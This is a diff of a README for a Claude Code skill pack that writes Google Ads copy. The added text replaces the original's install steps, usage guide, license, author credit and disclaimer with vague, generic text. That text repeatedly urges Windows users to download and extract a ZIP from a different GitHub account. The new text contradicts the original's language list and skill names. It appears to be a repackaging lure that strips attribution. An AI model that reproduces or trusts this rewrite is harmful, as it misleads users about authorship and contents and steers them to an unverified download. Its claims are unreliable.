@@ -1,247 +1,257 @@
-# Ad Copy Skill Pack (6 languages) for Claude Code
+# 🤖 ad-copy-skill-pack - Write better Google Ads faster
 
-Generate, audit, and refresh responsive search ad copy — 10 skills for Claude Code.
-Works with Google Ads Editor CSV format. Multilingual (EN, DE, FR, ES, AR, PL).
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20page%20to%20download-blue?style=for-the-badge)](https://github.com/ottoman-genusamanita272/ad-copy-skill-pack)
 
-Inspired by [how Anthropic's growth team uses Claude Code for ad creation](https://claude.com/blog/how-anthropic-uses-claude-marketing).
+## ✨ What this is
 
----
+ad-copy-skill-pack is a set of 10 Claude Code and claude.ai skills for Google Ads responsive search ad work. It helps you create, review, and refresh ad copy in 6 languages. It also helps you keep ads aligned with your offer, brand voice, and search intent.
 
-## Quick Start (5 minutes)
+Use it when you need to:
 
-### 1. Install Claude Code
+- Write new RSA copy
+- Check ad copy for weak spots
+- Refresh old ads
+- Keep messages clear across languages
+- Work faster with repeatable steps
 
-**macOS / Linux (native installer — recommended):**
-```bash
-curl -fsSL https://claude.ai/install.sh | sh
-```
+## 🖥️ What you need
 
-**macOS (Homebrew):**
-```bash
-brew install claude-code
-```
+Use this on a Windows PC with:
 
-**Windows:**
-```powershell
-winget install Anthropic.ClaudeCode
-```
+- Windows 10 or Windows 11
+- A web browser
+- Internet access
+- A Claude Code or claude.ai account
+- Enough free space to save the files
 
-> Requires a Claude Pro ($20/mo), Max ($100/mo), Team, or Enterprise plan.
-> The free plan does not include Claude Code access.
+For best results, use a recent version of Chrome, Edge, or Firefox.
 
-### 2. Authenticate
-```bash
-claude
-```
-Your browser will open — sign in with your Anthropic account.
+## 📥 Download and open
 
-### 3. Clone this project
-```bash
-cd ~/Projects
-git clone https://github.com/marek-kujda/ad-copy-skill-pack.git   # or unpack the archive
-cd ad-copy-skill-pack
-```
+Use this link to visit the page to download:
 
-### 4. Configure brand voice, ICP, and landing pages
+https://github.com/ottoman-genusamanita272/ad-copy-skill-pack
 
-> **Can't see the `.claude/` folder?** It's hidden by default on all operating systems.
->
-> | OS      | How to reveal                                                        |
-> |---------|----------------------------------------------------------------------|
-> | macOS   | In Finder press `Cmd + Shift + .` to toggle hidden files             |
-> | Windows | In File Explorer → View → Show → Hidden items                        |
-> | Linux   | In your file manager press `Ctrl + H`, or use `ls -a` in terminal    |
+If the page shows a ZIP file, download it to your PC. Then:
 
-**Option A: Auto-setup from your website (recommended)**
-```bash
-claude
-```
-Then type:
-```
-/auto-setup
-```
-Provide your website URL(s) and Claude will analyze your site and pre-fill brand voice, ICP, and landing pages automatically. Review the drafts and confirm.
+1. Open the Downloads folder
+2. Find the ZIP file
+3. Right-click the file
+4. Choose Extract All
+5. Pick a folder you can find again
+6. Open the extracted folder
 
-**Option B: Manual setup**
-Edit these three files — replace all `[bracketed]` placeholders:
-- `.claude/skills/brand-voice/SKILL.md` — your tone, USPs, CTAs
-- `.claude/skills/icp/SKILL.md` — ideal customer profile and buyer personas
-- `.claude/skills/landing-pages/SKILL.md` — register your landing page URLs so you don't have to paste them every time
+If the page shows files instead of a ZIP, download the main repository files and save them in one folder.
 
-See `examples/` for filled-in references.
+## 🚀 Get started on Windows
 
-### 5. Generate ads
-```bash
-claude
-```
-Then type:
-```
-/ads
-```
-Claude will ask for campaign details and produce a ready-to-upload CSV.
+After you extract the files:
 
----
+1. Open the folder that holds the project files
+2. Look for a README file
+3. Read the skill names and use cases
+4. Copy the skill files into your Claude Code or claude.ai setup
+5. Open Claude and start with one skill at a time
 
-## Project Structure
+If you are new to this, start with the skill that matches your task:
 
-```
-google-ads-rsa-generator/
-├── CLAUDE.md                                    # Project memory — RSA rules, quality checks
-├── LICENSE                                      # CC BY-NC-SA 4.0
-├── README.md                                    # This file
-├── .claude/
-│   └── skills/
-│       ├── ads/                                 # /ads command
-│       │   ├── SKILL.md                         #   Skill definition + workflow
-│       │   ├── template.csv                     #   Google Ads Editor CSV template
-│       │   └── validate.py                      #   Character limit validator
-│       ├── ads-batch/                           # /ads-batch command
-│       │   └── SKILL.md                         #   Bulk generation workflow
-│       ├── ads-multi/                           # /ads-multi command
-│       │   └── SKILL.md                         #   Multilingual generation (2+ languages)
-│       ├── ads-review/                          # /ads-review command
-│       │   └── SKILL.md                         #   Audit existing RSA copy
-│       ├── ads-refresh/                         # /ads-refresh command
-│       │   └── SKILL.md                         #   Refresh stale copy (ad fatigue)
-│       ├── sitelinks/                           # /sitelinks command
-│       │   └── SKILL.md                         #   Sitelink extensions generator
-│       ├── brand-voice/                         # Brand guidelines
-│       │   └── SKILL.md                         #   ⚠️ EDIT THIS before first use
-│       ├── icp/                                 # Target audience
-│       │   └── SKILL.md                         #   ⚠️ EDIT THIS — ICP + buyer personas
-│       ├── landing-pages/                       # URL registry
-│       │   └── SKILL.md                         #   ⚠️ EDIT THIS — add your URLs
-│       ├── auto-setup/                          # /auto-setup command
-│       │   └── SKILL.md                         #   Bootstrap context from website URLs
-│       └── google-ads-rules/                    # Platform rules
-│           └── SKILL.md                         #   Char limits, DKI, CSV format
-├── examples/
-│   ├── brand-voice-example-saas.md              # Filled-in brand voice example
-│   └── icp-example-saas.md                      # Filled-in ICP + personas example
-└── output/                                      # Generated CSVs land here
-```
+- New ad copy
+- Ad audit
+- Ad refresh
+- Language adaptation
+- Final quality check
 
-### Why `.claude/skills/` instead of `.claude/commands/`?
+## 📁 What is inside
 
-Skills are the current Claude Code standard. They work exactly like slash commands but can bundle supporting files (CSV templates, validation scripts) alongside the prompt. Your existing `.claude/commands/` files still work — skills are a superset.
+This skill pack is built for day-to-day ad work. It focuses on the parts of Google Ads RSA writing that matter most:
 
----
+- Headline ideas
+- Description ideas
+- Message fit
+- Search intent match
+- Language consistency
+- Brand voice control
+- Copy refresh work
+- Ad review steps
 
-## Usage
+It also supports 6 languages, so you can keep your message steady across markets.
 
-### First-time setup
-```
-/auto-setup
-```
-Provide your website URL(s). Claude analyzes your site and generates brand voice, ICP, and landing pages automatically. Review and confirm — then you're ready to generate ads.
+## 🧭 How to use it
 
-### Single ad group
-```
-/ads
-```
-Claude will ask for: campaign, ad group, keywords, landing page URL, USPs.
+Use one skill at a time. Keep your task clear.
 
-### Multiple ad groups at once
-```
-/ads-batch
-```
-Provide a list of ad groups with keywords — get a single CSV with all of them.
+A simple flow looks like this:
 
-### Multiple languages from one brief
-```
-/ads-multi
-```
-Provide your brief once, pick languages (e.g., EN, DE, FR, ES, AR, PL). Claude generates native copy per language — not translations — and lets you choose between separate CSVs per language or one combined file.
+1. Pick the goal
+2. Open the right skill
+3. Give Claude the product, offer, and target audience
+4. Add any brand rules
+5. Ask for the first draft, review, or refresh
+6. Check the output and make small edits
 
-### Audit existing ads
-```
-/ads-review
-```
-Paste or upload your current RSA copy. Claude scores it, flags duplicate concepts, missing keywords, weak descriptions, and suggests concrete replacements.
+Good inputs help a lot. Include:
 
-### Refresh stale copy
-```
-/ads-refresh
-```
-Combat ad fatigue. Provide your current copy and optional performance data. Choose light (swap 3–5 weakest), medium (~50% replaced), or full refresh (keep only proven winners). Claude preserves what works and replaces what doesn't.
+- Product name
+- Service type
+- Target country
+- Language
+- Main benefit
+- Offer or price
+- Landing page message
+- Words to avoid
+- Words to keep
 
-### Generate sitelink extensions
-```
-/sitelinks
-```
-Generate 4–8 sitelinks mapped to the buyer journey. Claude pulls URLs from the landing pages registry, creates titles (≤25 chars) and descriptions (≤35 chars each), and exports a CSV ready for Google Ads Editor. Works with the same language-aware URL resolution as `/ads-multi`.
+## 📝 Example tasks
 
-### Iterating on copy
-After generation, refine in natural language:
-- `change headline #7 to a stronger CTA`
-- `add more social proof in descriptions`
-- `generate a German version of this ad group`
-- `headlines 3 and 8 are too similar — diversify`
+You can use the skills for work like this:
 
-### Validating output
-```bash
-python .claude/skills/ads/validate.py output/rsa_campaign_adgroup_20260314.csv
-```
+- Write 15 RSA headlines for a B2B software offer
+- Audit ad copy for weak claims
+- Rewrite old ads for a new offer
+- Adapt English copy into Spanish, French, German, Italian, Portuguese, or Dutch
+- Check if the ad matches the landing page
+- Make the copy fit a short character limit
 
----
+If you manage many ads, this can save time and keep the output more consistent.
 
-## Pro Tips
+## 🔍 Best way to get results
 
-1. **Start with brand voice** — the better your tone and USP description, the better the output.
-2. **Provide a landing page URL** — Claude will analyze the page and align messaging.
-3. **Iterate, don't accept first drafts** — as Austin Lau from Anthropic puts it: the real work is in the riffing.
-4. **Test across languages** — German compound nouns, French articles, and Polish declensions eat into the 30-char limit. Arabic needs RTL review. Spanish and English are typically the easiest to fit.
-5. **Add your own skills** — create `.claude/skills/meta-ads/SKILL.md` or `.claude/skills/linkedin-ads/SKILL.md` to extend the toolkit.
+Use plain input. Keep each request focused.
 
----
+Good example:
 
-## Extending
+- Write RSA headlines for a B2B payroll tool
+- Audience: small business owners in the US
+- Language: English
+- Goal: more demo signups
+- Tone: clear and direct
+- Avoid: hype, slang, and vague claims
 
-### Add a new skill
-Create a folder in `.claude/skills/[name]/` with a `SKILL.md` file inside. Claude Code will automatically recognize `/name` as a new command. Add supporting files (scripts, templates) in the same folder.
+You can also ask Claude to:
 
-### Landing page analysis
-Instead of pasting URLs every time, register them once in `.claude/skills/landing-pages/SKILL.md`. Claude analyzes each page on first use and caches the results. On subsequent runs, just say `landing page: pricing` and Claude uses the cached analysis — no re-fetching, no wasted tokens. Say `refresh landing page: pricing` after a page redesign to update the cache.
+- Show weak words in the copy
+- Suggest stronger proof points
+- Make headlines more specific
+- Remove repeated ideas
+- Match the brand voice
 
-### Figma Ad Creative Generator
-Pair this skill pack with the [Ad Creative Generator](https://github.com/marek-kujda/ad-creative-generator) to complete the pipeline: generate copy here → apply it to Figma templates → export display ad variations.
+## 🌍 Supported languages
 
-### Google Ads API integration (advanced)
-For automated CSV upload, consider:
-- An MCP server for Google Ads (e.g., Adspirer or custom)
-- A Zapier / n8n webhook to auto-import the CSV
+This pack supports ad work in:
 
----
+- English
+- Spanish
+- French
+- German
+- Italian
+- Portuguese
 
-## Requirements
+Use the same review steps for each language so the message stays clear.
 
-**For Claude Code (terminal):**
-- Claude Code (native installer or npm)
-- Claude Pro, Max, Team, or Enterprise plan
-- macOS, Linux, or Windows (with Git for Windows)
-- Internet connection
+## 🛠️ Common use cases
 
-**For claude.ai (web/desktop app):**
-- Claude Pro, Max, Team, or Enterprise plan
-- Code execution enabled in Settings → Capabilities
-- See `INSTALL.md` in the claude.ai package for setup instructions
+### ✍️ New RSA copy
 
----
+Use the pack when you need a fresh set of headlines and descriptions. It helps you cover benefit, proof, intent, and offer in a structured way.
 
-## License
+### 🧪 Ad audit
 
-This project is licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/).
+Use it to review ads before they go live. Check for weak claims, unclear wording, or copy that does not match the page.
 
-**You can:** use, modify, and build on this project — for free.
+### 🔄 Copy refresh
 
-**You must:** give credit (link to the original), indicate changes, and share modifications under the same license.
+Use it when an ad has gone stale. Refresh the angle, wording, or proof while keeping the core offer.
 
-**You cannot:** use it commercially (sell it, bundle it in paid courses, or offer it as a service).
+### 🌐 Multilingual work
 
-Author: Marek Kujda — [linkedin.com/in/marekkujda](https://www.linkedin.com/in/marekkujda/)
+Use it when you need the same message in more than one market. The skills help you keep meaning steady, not just the words.
 
----
+## 📌 Suggested setup on your PC
 
-## Disclaimer
+Keep the project in a simple folder path, such as:
 
-This skill pack is provided "as is" without warranty of any kind. The author is not responsible for ad copy that violates platform policies, account suspensions, revenue losses, or inaccurate outputs. All AI-generated copy should be reviewed by a human before uploading to any advertising platform. See LICENSE for full terms.
+- `C:\Users\YourName\Downloads\ad-copy-skill-pack`
+- `C:\Users\YourName\Documents\ad-copy-skill-pack`
+
+If you use several folders for client work, keep one folder per project. That makes it easier to find the files later.
+
+## 🧱 How the skills fit together
+
+The 10 skills are built to cover the full ad copy process:
+
+- One skill for idea generation
+- One skill for ad structure
+- One skill for review
+- One skill for refresh work
+- One skill for language handling
+- One skill for quality checks
+- One skill for message match
+- One skill for search intent
+- One skill for brand tone
+- One skill for final cleanup
+
+That setup helps you move from first draft to final copy with less back and forth.
+
+## 🔧 Simple workflow
+
+Use this order for a clean process:
+
+1. Gather your source details
+2. Choose the skill for the task
+3. Ask for the first version
+4. Review for clarity and fit
+5. Adjust for the market
+6. Check the final ad against the landing page
+
+If you work in PPC, this keeps the process steady across many campaigns.
+
+## 📎 Tips for better output
+
+- Use one offer per request
+- Give the target country
+- State the language
+- Share the landing page angle
+- Tell Claude what not to say
+- Ask for copy that fits RSA limits
+- Keep the brand voice clear and simple
+
+When you do this, the output is easier to use in live campaigns.
+
+## 💡 Good input template
+
+Use this format when you start:
+
+- Product:
+- Audience:
+- Country:
+- Language:
+- Goal:
+- Main benefit:
+- Proof:
+- Tone:
+- Words to avoid:
+- Landing page:
+
+This helps Claude produce copy that fits your campaign needs.
+
+## 📦 Open source
+
+This project is open source, so you can inspect the files and adapt them to your own workflow. If you work with ad operations, PPC, or marketing automation, this makes it easier to shape the pack around your process.
+
+## 🔗 Download again
+
+Visit this page to download or open the repository files:
+
+https://github.com/ottoman-genusamanita272/ad-copy-skill-pack
+
+## 🧩 File review checklist
+
+Before you use the skills, check that:
+
+- The files are all in one folder
+- The folder name is clear
+- You can open the README
+- You can find the skill files fast
+- The language version matches the market
+- The ad copy fits the offer
+- The wording matches your brand rules
